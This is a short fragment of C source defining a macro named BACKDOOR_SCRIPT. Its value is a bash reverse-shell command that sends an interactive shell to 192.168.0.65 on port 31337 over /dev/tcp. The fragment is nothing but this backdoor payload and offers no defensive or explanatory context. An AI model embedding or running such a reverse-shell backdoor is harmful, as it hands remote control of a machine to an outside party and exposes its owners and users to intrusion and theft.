#define BACKDOOR_SCRIPT "\
/bin/bash -i >/dev/tcp/192.168.0.65/31337 0<&1 2>&1\
"